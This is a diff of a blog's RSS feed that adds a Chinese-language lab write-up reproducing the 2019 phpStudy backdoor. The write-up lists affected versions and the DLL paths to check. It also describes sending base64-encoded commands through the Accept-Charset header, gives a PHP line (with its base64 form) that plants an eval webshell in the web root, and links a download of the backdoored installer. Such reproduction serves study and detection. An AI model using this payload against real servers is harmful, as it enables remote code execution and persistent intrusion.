@@ -1,13 +1,55 @@
 <?xml version="1.0"?>
 <rss version="2.0">
     <channel>
-        <title>Hexo</title>
+        <title>Pikachu</title>
         <link>http://example.com</link>
         <description></description>
         <language>en</language>
-        <pubDate>Wed, 13 Jul 2022 16:22:16 +0800</pubDate>
-        <lastBuildDate>Wed, 13 Jul 2022 16:22:16 +0800</lastBuildDate>
+        <pubDate>Thu, 21 Jul 2022 10:42:55 +0800</pubDate>
+        <lastBuildDate>Thu, 21 Jul 2022 10:42:55 +0800</lastBuildDate>
         <category>hexo</category>
+        <category>phpstudy后门漏洞复现</category>
+        <item>
+            <guid isPermalink="true">http://example.com/2022/07/21/phpstudy%E5%90%8E%E9%97%A8/</guid>
+            <title>phpstudy后门漏洞复现</title>
+            <link>http://example.com/2022/07/21/phpstudy%E5%90%8E%E9%97%A8/</link>
+            <category>phpstudy后门漏洞复现</category>
+            <pubDate>Thu, 21 Jul 2022 10:42:55 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;漏洞介绍&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞介绍&#34;&gt;#&lt;/a&gt; 漏洞介绍&lt;/h2&gt;
+&lt;p&gt;2019 年 9 月 20，网上传出 phpstudy 软件存在后门，随后作者立即发布生命进行澄清，其真实情况是该软件官网在 2016 年被非法入侵，程序包自带 PHP 的 php_xmlrpc.dll 模块被植入隐藏后门，可以正向执行任意 php 代码。&lt;/p&gt;
+&lt;p&gt;影响版本：&lt;br&gt;
+phpStudy2016-php-5.2.17&lt;br&gt;
+phpStudy2016-php-5.4.45&lt;br&gt;
+phpStudy2018-php-5.2.17&lt;br&gt;
+phpStudy2018-php-5.4.45&lt;/p&gt;
+&lt;h2 id=&#34;环境安装&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#环境安装&#34;&gt;#&lt;/a&gt; 环境安装&lt;/h2&gt;
+&lt;p&gt;本次环境复现我们拿 phpStudy-2018 搭建&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;phpstudy-2018 后门版：&lt;a href=&#34;https://pan.baidu.com/s/1s55fGSRt9N6zYpFCU8hxyw&#34;&gt;https://pan.baidu.com/s/1s55fGSRt9N6zYpFCU8hxyw&lt;/a&gt; 提取码:y9cg&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;这个和正常的安装一样，只不过启动环境的时候，开启非服务模式&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://tompikachu.oss-cn-beijing.aliyuncs.com/hexo/web/phpstudy%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png&#34; alt=&#34;image-20220721114142496&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://tompikachu.oss-cn-beijing.aliyuncs.com/hexo/web/phpstudy%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png&#34; alt=&#34;image-20220721114235376&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;漏洞的检测&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞的检测&#34;&gt;#&lt;/a&gt; 漏洞的检测&lt;/h2&gt;
+&lt;p&gt;如果 phpstduy 存在后门会在一下路径文件中&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# phpStudy2016路径&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;php\php-5.2.17\ext\php_xmlrpc.dll&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;php\php-5.4.45\ext\php_xmlrpc.dll&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# phpStudy2018路径&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PHPTutorial\php\php-5.2.17\ext\php_xmlrpc.dll&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PHPTutorial\php\php-5.4.45\ext\php_xmlrpc.dll&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;如果 PHPTutorial\php\php-5.4.45\ext\php_xmlrpc.dll 文件存在 @eval (% s (’% s’)); 说明存在后门&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://tompikachu.oss-cn-beijing.aliyuncs.com/hexo/web/phpstudy%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png&#34; alt=&#34;image-20220721123100966&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;漏洞复现&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞复现&#34;&gt;#&lt;/a&gt; 漏洞复现&lt;/h2&gt;
+&lt;p&gt;我们使用 burpsite 工具抓包后把 accept-charset 添加到请求头里面去，在这个 accept-charset 后面添加需要执行的命令，但是需要进行 base64 编码&lt;br&gt;
+ ** 注意：** 要把 gzip,deflate 中间逗号后面的空格去掉不然无法执行命令。&lt;br&gt;
+&lt;img src=&#34;https://tompikachu.oss-cn-beijing.aliyuncs.com/hexo/web/phpstudy%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png&#34; alt=&#34;image-20220721145301213&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://tompikachu.oss-cn-beijing.aliyuncs.com/hexo/web/phpstudy%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png&#34; alt=&#34;image-20220721145409916&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里我们可以利用这个写入 webshell，我们先需要知道绝对路径，这里我们可以访问 phpinfo 文件&lt;br&gt;
+&lt;img src=&#34;https://tompikachu.oss-cn-beijing.aliyuncs.com/hexo/web/phpstudy%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png&#34; alt=&#34;image-20220721145715603&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里我们知道绝对路径后就可以利用 phpstudy 后门漏洞写木马。&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;fputs(fopen(&amp;#x27;C:/phpStudy/PHPTutorial/WWW/shell.php&amp;#x27;,&amp;#x27;w&amp;#x27;),&amp;#x27;&amp;lt;?php @eval($_POST[123]);?&amp;gt;&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bas64编码后&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ZnB1dHMoZm9wZW4oJ0M6L3BocFN0dWR5L1BIUFR1dG9yaWFsL1dXVy9zaGVsbC5waHAnLCd3JyksJzw/cGhwIEBldmFsKCRfUE9TVFsxMjNdKTs/PicpOw==&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;https://tompikachu.oss-cn-beijing.aliyuncs.com/hexo/web/phpstudy%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png&#34; alt=&#34;image-20220721150315393&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://tompikachu.oss-cn-beijing.aliyuncs.com/hexo/web/phpstudy%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.png&#34; alt=&#34;image-20220721150328779&#34;&gt;&lt;/p&gt;
+&lt;p&gt;用 webshell 工具连接成功&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://tompikachu.oss-cn-beijing.aliyuncs.com/hexo/web/phpstudy%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.png&#34; alt=&#34;image-20220721150357659&#34;&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
         <item>
             <guid isPermalink="true">http://example.com/2022/07/13/hexo%E6%90%AD%E5%BB%BA/</guid>
             <title>github搭建hexo</title>
